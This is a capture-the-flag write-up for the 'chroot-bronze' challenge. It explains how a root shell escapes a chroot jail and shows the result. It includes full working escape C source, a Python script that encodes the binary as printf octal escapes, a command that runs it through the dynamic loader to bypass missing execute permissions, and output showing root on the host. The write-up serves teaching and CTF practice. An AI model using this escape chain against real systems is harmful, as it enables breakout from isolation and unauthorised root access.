# chroot-bronze

**Event:** Kaspersky CTF 2026
**Category:** misc
**Points:** 77
**Flag:** `kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}` (submitted, platform status `Correct`)

---

- **Task ID:** 13
- **Type:** `dynamic_docker` (personal instance)
- **Description:** *"Why do you need Docker when you have chroot?"* - connect via TLS:
  ```
  openssl s_client -connect <id>.tcp.kit.sasc.tf:443 -servername <id>.tcp.kit.sasc.tf -quiet
  ```

## TL;DR

The service drops you into `/bin/sh` running **as root** inside a `chroot` jail.
`chroot` is *not* a security boundary: a root process can escape it with the classic
`mkdir` → `chroot(subdir)` → `chdir("..")*N` → `chroot(".")` trick. The flag lives on the
real host filesystem outside the jail.

## Recon

Start the instance and connect:

```bash
/Users/dan/ctf/kaspersky/kasperskyinstance start 13 --wait
# tcp://<id>.tcp.kit.sasc.tf:443
```

The shell is extremely bare - most commands are missing (`id`, `ls`, `uname`, `cat`,
`head` are all "not found"). Only shell builtins work. Using globbing (`echo /*`) we map
the entire jail:

```
/bin/sh
/lib/x86_64-linux-gnu/libc.so.6
/lib64/ld-linux-x86-64.so.2
```

- No `/proc`, `/etc`, `/tmp`, `/home`, `/root`.
- No flag inside the jail → this is a **chroot escape** challenge.

Key facts gathered with builtins only:

- The jail root `/` is **writable** (`printf hi > /t` → `rc=0`).
- glibc version (execute the loader): `ld.so (Ubuntu GLIBC 2.43) … version 2.43`.
- Architecture: x86-64 (`ld-linux-x86-64.so.2`).

## The problem

The standard root chroot escape must run compiled code, but the jail has **no compiler
and no upload channel**, and shell redirection cannot set the execute bit (so even root
cannot `exec` a plain written file - root still needs at least one `x` bit).

Two tricks solve both issues:

1. **Run without the execute bit** - invoke the ELF through the dynamic loader:
   `/lib64/ld-linux-x86-64.so.2 /e`. The loader maps the ELF as *data*, bypassing the
   missing `+x` permission.
2. **Transfer without base64/upload** - write the binary byte-by-byte with dash's
   `printf` using 3-digit octal escapes (`printf '\177\105\114\106…' > /e`). Exactly 3
   octal digits per byte prevents adjacent escapes from merging.

Because the jail glibc (2.43) is newer than the build host glibc (2.39), a normally
dynamically-linked binary built on the host runs fine under the jail's libc
(backward compatibility).

## Exploit

### 1. Escape program - [`escape.c`](escape.c)

```c
#include <sys/stat.h>
#include <unistd.h>
int main(void){
    mkdir(".x", 0755);
    chroot(".x");                     // cwd is now OUTSIDE the new root
    for(int i=0;i<256;i++) chdir(".."); // walk up to the real /
    chroot(".");                      // re-root at the real filesystem
    char *args[] = {"/bin/sh","-c",
      "PATH=/bin:/usr/bin:/sbin:/usr/sbin; echo ==WHOAMI==; id; "
      "echo ==FINDFLAG==; ls -la /; cat /flag* 2>/dev/null; "
      "find / -maxdepth 3 -iname '*flag*' 2>/dev/null "
      "-exec echo {} \\; -exec cat {} \\;", NULL};
    execv("/bin/sh", args);           // real host /bin/sh with coreutils
    return 0;
}
```

Why it works: after `chroot(".x")` the kernel changes the process root but leaves the
current working directory unchanged - now the cwd sits *above* (outside) the new root.
Repeated `chdir("..")` from an out-of-root cwd climbs all the way to the real `/`, and
`chroot(".")` re-roots the process there.

### 2. Build on x86-64 host (`ssh pwnbox`)

```bash
gcc -O2 -o /tmp/escape /tmp/escape.c && strip /tmp/escape
# ELF 64-bit LSB pie executable, x86-64, dynamically linked
```

### 3. Generate the transfer+run payload

```python
d = open("escape.bin", "rb").read()
esc = "".join("\\%03o" % b for b in d)  # 3-digit octal per byte
cmd = "printf '" + esc + "' > /e\n/lib64/ld-linux-x86-64.so.2 /e\n"
open("payload.txt", "w").write(cmd)
```

### 4. Fire it over the TLS shell

```bash
cat payload.txt | openssl s_client \
  -connect <id>.tcp.kit.sasc.tf:443 \
  -servername <id>.tcp.kit.sasc.tf -quiet
```

## Result

```
==WHOAMI==
uid=0(root) gid=0(root)
==FINDFLAG==
drwxr-xr-x  bin
drwxr-xr-x  dev
drwxr-xr-x  etc
dr-xr-xr-x  proc
drwxr-xr-x  root
drwxr-xr-x  sbin
dr-xr-xr-x  sys
kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}
```

We are `uid=0` on the real host root filesystem (note the full `bin/dev/etc/proc/sys`
tree that did not exist inside the jail), and `cat /flag*` prints the flag.

## Flag

```
kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}
```

Submitted with:

```bash
/Users/dan/ctf/kaspersky/kasperskyflag 13 'kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}'
# {"status": "Correct"}
```

## Artifacts

- `escape.c`, chroot-escape source
- `escape.bin`, compiled x86-64 ELF (built on pwnbox)
- `payload.txt`, `printf`-octal transfer + `ld.so` execution one-liner
- `escape.b64` / `escape.bin`, intermediate build artifacts

## Takeaways

::: pitfall
- `chroot` only changes the process root; it does **not** revoke `CAP_SYS_CHROOT` or
  reset the cwd, so a root process trivially escapes. It is an isolation convenience,
  not a security sandbox - hence *"Why do you need Docker when you have chroot?"*.
- Missing binaries in a jail are not a barrier: `printf` octal writes arbitrary bytes and
  `ld-linux.so <file>` executes non-`+x` ELFs.
:::
